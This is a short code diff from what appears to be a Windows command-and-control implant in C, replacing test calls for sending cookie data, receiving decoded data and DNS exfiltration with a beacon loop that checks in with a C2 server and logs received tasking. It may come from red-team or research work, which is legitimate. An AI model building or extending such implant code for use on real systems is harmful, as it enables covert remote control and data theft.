@@ -29,29 +29,23 @@ int main() {
     heap = GetProcessHeap();
 
 
+    
+    while (1) {
+        // Recv data TODO: handle timeouts in c2_comm.h with loop
+        c2_send("READY", 5); // we need an initial send so we can get a corresponding response
+        int n = c2_recv(buffer, 1024);
+        if (n <= 0) {
+            c2_log("[!] Didn't receive any data!\n");
+            continue;
+        }
 
+        // Just print data for now
+        c2_log("DATA: %s\n", buffer);
+        
 
-    // Test send cookie data
-    char* data = "!text to base64 encode!";
-    len = c2_send(data, strlen(data));
-    if (len == 0) {
-        c2_log("[!] cookie send failed\n");
-        return -1;
+        // Clear buffer
+        memset(buffer, 0, 1024);
     }
-
-
-    // Test recieve data
-    len = c2_recv(buffer, 1024);
-    if (len == 0) {
-        c2_log("[!] data recv failed\n");
-    }
-    else {
-        c2_log("[+] DECODED: %s\n", buffer);
-    }
-
-
-    // Test DNS
-    c2_exfil("AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB", 32);
     
 
 
